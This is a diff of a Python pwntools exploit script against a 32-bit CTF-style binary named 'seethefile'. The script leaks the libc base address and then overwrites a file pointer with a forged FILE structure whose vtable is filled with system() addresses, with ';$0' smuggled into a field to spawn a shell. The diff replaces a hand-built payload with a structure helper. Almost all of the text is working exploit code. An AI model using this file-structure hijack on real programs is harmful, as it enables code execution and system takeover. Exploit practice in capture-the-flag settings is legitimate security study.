@@ -1,6 +1,5 @@
 from pwn import *
 from FILE import *
-from binascii import hexlify
 context.arch = 'i386'
 elf = ELF('seethefile')
 libc = ELF('libc_32.so.6')
@@ -32,29 +31,18 @@ io.recvuntil('[heap]\n')
 libc_base = int(io.recv(8),16)+0x1000
 info('LIBC BASE -> %#x'%libc_base)
 close()
-'''
+
+fake_fp = elf.sym['fp']+0x4
+
 payload = '\x00'*0x20
-payload += p32(elf.sym['fp']+0x4)
-ff = '/bin/sh\x00'
-ff += p32(0)*11
-ff += p32(elf.bss()+0x20)
-ff += p32(3)
-ff += p32(0)*3
-ff += p32(elf.bss()+0x20)
-ff += p32(0xffffffff)*2
-ff += p32(0)
-ff += p32(elf.bss()+0x20)
-ff += p32(0)*14
-payload += ff
-payload += p32(elf.sym['fp']+0x4+0x98)
+payload += p32(fake_fp)
+ff = IO_FILE_plus_struct()
+ff._flags = u32('\xff\xff\xdf\xff') 	# keep the fp._flags
+ff._IO_read_ptr = u32(';$0\x00') 	# $0==bash and `;` to split commands
+ff.vtable = fake_fp+0x98
+payload += str(ff)
 payload += p32(0)*2
 payload += p32(libc.sym['system']+libc_base)*19
-'''
-payload = 0x20 * "\x00"
-payload += p32(elf.sym['fp']+0x4)
-payload += "/bin/sh\x00" 
-payload += p32(0)*11 + p32(0x804b260) + p32(3) + p32(0)*3 + p32(0x804b260) + p32(0xffffffff)*2 + p32(0) + p32(0x804b260) + p32(0)*14 + p32(0x804B31C)
-payload += p32(libc.sym['system'] + libc_base)*21
 
 iexit(payload)
 
